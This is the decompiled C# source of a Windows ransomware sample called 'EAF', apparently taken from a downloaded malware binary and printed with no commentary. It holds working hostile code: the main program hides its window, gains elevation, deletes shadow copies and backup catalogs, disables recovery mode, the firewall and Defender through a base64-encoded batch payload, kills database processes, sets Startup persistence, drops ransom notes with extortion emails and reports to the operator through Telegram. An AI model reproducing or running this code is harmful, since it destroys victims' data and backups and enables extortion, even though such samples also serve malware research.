// Decompiled with JetBrains decompiler
// Type: Fast.Program
// Assembly: encoderdecryption@yandex.ru, Version=2.0.2.2, Culture=neutral, PublicKeyToken=null
// MVID: C353C6AA-D71D-41FD-A002-1E85FFB3A964
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32-d2c47b1c94e6beadbc222771e788e9dafe194c462760b0d16cd25cbc0a572a00.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Fast
{
  internal class Program
  {
    public static string[] messages = new string[10]
    {
      "ATTENTION!",
      "At the moment, your system is not protected.",
      "We can fix it and restore files.",
      "To get started, send a file to decrypt trial.",
      "Don't pay any money, when we didn't decrypt trial file.",
      "You can trust us after opening the test file.",
      "To restore the system write to this address: ",
      "",
      "Email 1: encoderdecryption@yandex.ru",
      "Email 2: encoderdecryption@gmail.com"
    };
    public static string droppedMessageTextbox = "#FILES-ENCRYPTED.txt";
    public static string email1 = "encoderdecryption@yandex.ru";
    public static string email2 = "encoderdecryption@gmail.com";
    public static string[] validExtensions = new string[1]
    {
      ".EAF"
    };
    public static string strProcessURL = Process.GetCurrentProcess().ProcessName;
    public static string strProcessName = Assembly.GetExecutingAssembly().GetName().Name;
    public static string processName = Program.strProcessName + ".exe";
    public static string processURL = Program.strProcessURL + ".url";
    public static string txtName = "This Is Your Helper File.txt";
    public static string A = "1qw0ll8p9m8uezhqhyd";
    public static string B = "7z459ajrk722yn8c5j4fg";
    public static string C = "17CqMQFeuB3NTzJ";
    public static string D = "2X28tfRmWaPyPQgvoHV";
    public static string keyword = "QWERTYUIOPASDFGHJKLZXCVBNM";
    public static string RndKey = "";
    public static Random rnd = new Random();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private static void Main(string[] args)
    {
      Console.Title = "encoderdecryption@yandex.ru";
      Program.ShowWindow(Program.GetConsoleWindow(), 0);
      if (Program.AlreadyRunning())
        Environment.Exit(1);
      Program.copyResistForAdmin(Program.processName);
      Program.runas_bat();
      Program.RndKey = "";
      Program.Reg();
      Program.deleteBackupCatalog();
      Program.disableRecoveryMode();
      Program.deleteShadowCopies();
      Program.some_cmd();
      Program.checkTask();
      Program.BackUp();
      Program.spreadIt();
      Program.addAndOpenNote();
      Program.RndKey = Program.CreatePassword(Program.rnd.Next(20, 26));
      Icon.SaveImage();
      Telegram.SendForOwner();
      Program.addLinkToStartup();
      ENC1.Start();
      ENC2.Start();
      ENC3.Start();
      ENC4.Start();
      EAF.DestoryExeFile();
    }

    private static void some_cmd()
    {
      Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
      Program.runCommand("bcdedit /set {default} recoveryenabled no");
      Program.runCommand("netsh advfirewall set currentprofile state off");
      Program.runCommand("netsh firewall set opmode mode=disable");
    }

    private static void BackUp()
    {
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string s = "QGVjaG8gb2ZmDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xCYWNrdXBcQ2xpZW50IiAvdiAiRGlzYWJsZUJhY2t1cFVJIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZWN1cml0eVByb3ZpZGVyc1xTQ0hBTk5FTCIgL3YgIkNsaWVudENhY2hlVGltZSIgL3QgUkVHX0RXT1JEIC9kICIwIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU3lzdGVtUmVzdG9yZSIgL3YgIkRpc2FibGVTUiIgL3QgUkVHX0RXT1JEIC9kICIxIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU3lzdGVtUmVzdG9yZSIgL3YgIkRpc2FibGVDb25maWciIC90IFJFR19EV09SRCAvZCAiMSIgL2YNClJlZy5leGUgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3YgIkVuYWJsZUxVQSIgL3QgUkVHX0RXT1JEIC9kICIwIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiAiUHJvbXB0T25TZWN1cmVEZXNrdG9wIiAvdCBSRUdfRFdPUkQgL2QgIjAiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJFbmFibGVMVUEiIC90IFJFR19EV09SRCAvZCAiMSIgL2YNClJlZy5leGUgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3YgIkNvbnNlbnRQcm9tcHRCZWhhdmlvckFkbWluIiAvdCBSRUdfRFdPUkQgL2QgIjAiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxwb2xpY2llc1xzeXN0ZW1cQ3JlZFNTUFxQYXJhbWV0ZXJzIiAvdiAiQWxsb3dFbmNyeXB0aW9uT3JhY2xlIiAvdCBSRUdfRFdPUkQgL2QgIjIiIC9mDQpSZWcuZXhlIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xFeHBsb3JlciIgL3YgIk5vQ29udHJvbFBhbmVsIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xFeHBsb3JlciIgL3YgIk5vQ29udHJvbFBhbmVsIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBOVFxUZXJtaW5hbCBTZXJ2aWNlcyIgL3YgIlVzZXJBdXRoZW50aWNhdGlvbiIgL3QgUkVHX0RXT1JEIC9kICIwIiAvZg0KUmVnLmV4ZSBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgTlRcVGVybWluYWwgU2VydmljZXMiIC92ICJmRGVueVRTQ29ubmVjdGlvbnMiIC90IFJFR19EV09SRCAvZCAiMCIgL2YNClJlZy5leGUgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiAiRGlzYWJsZUFudGlTcHl3YXJlIiAvdCBSRUdfRFdPUkQgL2QgIjEiIC9mDQpSZWcuZXhlIGFkZCAiSEtDUlwqXHNoZWxsXHJ1bmFzIiAvdmUgL3QgUkVHX1NaIC9kICJUYWtlIE93bmVyc2hpcCIgL2YNClJlZy5leGUgYWRkICJIS0NSXCpcc2hlbGxccnVuYXMiIC92ICJOb1dvcmtpbmdEaXJlY3RvcnkiIC90IFJFR19TWiAvZCAiIiAvZg0KUmVnLmV4ZSBhZGQgIkhLQ1JcKlxzaGVsbFxydW5hc1xjb21tYW5kIiAvdmUgL3QgUkVHX1NaIC9kICJjbWQuZXhlIC9jIHRha2Vvd24gL2YgXCIlJTFcIiAmJiBpY2FjbHMgXCIlJTFcIiAvZ3JhbnQgYWRtaW5pc3RyYXRvcnM6RiIgL2YNClJlZy5leGUgYWRkICJIS0NSXCpcc2hlbGxccnVuYXNcY29tbWFuZCIgL3YgIklzb2xhdGVkQ29tbWFuZCIgL3QgUkVHX1NaIC9kICJjbWQuZXhlIC9jIHRha2Vvd24gL2YgXCIlJTFcIiAmJiBpY2FjbHMgXCIlJTFcIiAvZ3JhbnQgYWRtaW5pc3RyYXRvcnM6RiIgL2YNClJlZy5leGUgYWRkICJIS0NSXERpcmVjdG9yeVxzaGVsbFxydW5hcyIgL3ZlIC90IFJFR19TWiAvZCAiVGFrZSBPd25lcnNoaXAiIC9mDQpSZWcuZXhlIGFkZCAiSEtDUlxEaXJlY3Rvcnlcc2hlbGxccnVuYXMiIC92ICJOb1dvcmtpbmdEaXJlY3RvcnkiIC90IFJFR19TWiAvZCAiIiAvZg0KUmVnLmV4ZSBhZGQgIkhLQ1JcRGlyZWN0b3J5XHNoZWxsXHJ1bmFzXGNvbW1hbmQiIC92ZSAvdCBSRUdfU1ogL2QgImNtZC5leGUgL2MgdGFrZW93biAvZiBcIiUlMVwiIC9yIC9kIHkgJiYgaWNhY2xzIFwiJSUxXCIgL2dyYW50IGFkbWluaXN0cmF0b3JzOkYgL3QiIC9mDQpSZWcuZXhlIGFkZCAiSEtDUlxEaXJlY3Rvcnlcc2hlbGxccnVuYXNcY29tbWFuZCIgL3YgIklzb2xhdGVkQ29tbWFuZCIgL3QgUkVHX1NaIC9kICJjbWQuZXhlIC9jIHRha2Vvd24gL2YgXCIlJTFcIiAvciAvZCB5ICYmIGljYWNscyBcIiUlMVwiIC9ncmFudCBhZG1pbmlzdHJhdG9yczpGIC90IiAvZg==";
        string uid = what.UID;
        string path = folderPath + "\\" + uid + ".bat";
        byte[] buffer = Convert.FromBase64String(s);
        using (FileStream fileStream = new FileStream(path, FileMode.Create))
        {
          fileStream.Write(buffer, 0, buffer.Length);
          fileStream.Flush();
        }
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          Verb = "runas",
          FileName = path,
          WindowStyle = ProcessWindowStyle.Normal
        };
        process.Start();
        process.WaitForExit();
      }
      catch (Exception ex)
      {
      }
    }

    private static void deleteBackupCatalog() => Program.runCommand("wbadmin delete catalog -quiet");

    private static void disableRecoveryMode() => Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");

    private static void deleteShadowCopies() => Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");

    private static void runCommand(string commands)
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          Verb = "runas",
          FileName = "cmd.exe",
          Arguments = "/C " + commands,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        process.WaitForExit();
      }
      catch
      {
      }
    }

    private static void addAndOpenNote()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
      try
      {
        File.WriteAllLines(str, Program.messages);
        Thread.Sleep(500);
        Process.Start(str);
      }
      catch
      {
      }
    }

    private static void Reg()
    {
      try
      {
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) 1, RegistryValueKind.String);
        Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) "empty", RegistryValueKind.String);
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        subKey.SetValue("legalnoticecaption", (object) "EAF", RegistryValueKind.String);
        subKey.SetValue("legalnoticetext", (object) "You were attacked by the EAF team plz read #FILES-ENCRYPTED.txt", RegistryValueKind.String);
        Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop").SetValue("Wallpaper", (object) "", RegistryValueKind.String);
      }
      catch
      {
      }
    }

    public static string UniqueID()
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)).Remove(1, 2) + ":\"");
      managementObject.Get();
      string str1 = managementObject["VolumeSerialNumber"].ToString();
      if (!string.IsNullOrEmpty(str1))
        return str1;
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
      string str2 = "";
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        str2 = managementBaseObject["SerialNumber"].ToString();
      return str2;
    }

    public static string GetID()
    {
      object obj = (object) "";
      NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
      int index = 0;
      if (index < networkInterfaces.Length)
        obj = (object) networkInterfaces[index].GetPhysicalAddress().ToString();
      if (string.IsNullOrEmpty(obj.ToString()))
        obj = (object) Environment.UserName;
      return Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.ToString()));
    }

    private static void runas_bat()
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          Verb = "runas",
          FileName = "cmd.exe",
          Arguments = "/C reagentc /disable",
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        process.WaitForExit();
      }
      catch
      {
      }
    }

    private static void addLinkToStartup()
    {
      using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Process.GetCurrentProcess().ProcessName + ".url"))
      {
        string location = Assembly.GetExecutingAssembly().Location;
        streamWriter.WriteLine("[InternetShortcut]");
        streamWriter.WriteLine("URL=file:///" + location);
        streamWriter.WriteLine("IconIndex=0");
        string str = location.Replace('\\', '/');
        streamWriter.WriteLine("IconFile=" + str);
      }
    }

    private static bool AlreadyRunning()
    {
      Process[] processes = Process.GetProcesses();
      Process currentProcess = Process.GetCurrentProcess();
      foreach (Process process in processes)
      {
        try
        {
          if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
            return true;
        }
        catch (Exception ex)
        {
        }
      }
      return false;
    }

    private static void spreadIt()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (!File.Exists(drive.ToString() + Program.droppedMessageTextbox))
        {
          try
          {
            File.WriteAllLines(drive.ToString() + Program.droppedMessageTextbox, Program.messages);
          }
          catch
          {
          }
        }
      }
    }

    private static void copyResistForAdmin(string processName)
    {
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str3 = str2 + processName;
      ProcessStartInfo startInfo = new ProcessStartInfo(str3)
      {
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Normal,
        WorkingDirectory = str2
      };
      new Process().StartInfo = startInfo;
      if (!(friendlyName != processName) && !(location != str3))
        return;
      if (!File.Exists(str3))
      {
        File.Copy(friendlyName, str3);
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
      else
      {
        try
        {
          File.Delete(str3);
          Thread.Sleep(200);
          File.Copy(friendlyName, str3);
        }
        catch
        {
        }
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode == 1223)
            Program.copyResistForAdmin(processName);
        }
      }
    }

    public static void checkTask()
    {
      List<string> stringList = new List<string>()
      {
        "taskmgr",
        "sqlagent",
        "winword",
        "sqlbrowser",
        "sqlservr",
        "sqlwriter",
        "oracle",
        "ocssd",
        "dbsnmp",
        "synctime",
        "mydesktopqos",
        "agntsvc.exeisqlplussvc",
        "xfssvccon",
        "mydesktopservice",
        "ocautoupds",
        "agntsvc.exeagntsvc",
        "agntsvc.exeencsvc",
        "firefoxconfig",
        "tbirdconfig",
        "ocomm",
        "mysqld",
        "sql",
        "mysqld-nt",
        "mysqld-opt",
        "dbeng50",
        "sqbcoreservice",
        "SQLWriter",
        "SQLBrowser",
        "MSSQLSERVER",
        "MSSQL$CONTOSO1",
        "MSDTC",
        "SQLSERVERAGENT",
        "vds"
      };
      Process[] processes = Process.GetProcesses();
      try
      {
        foreach (Process process in processes)
        {
          foreach (string str in stringList)
          {
            if (process.ProcessName.ToLower().Contains(str.ToLower()))
              process.Kill();
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }
  }
}
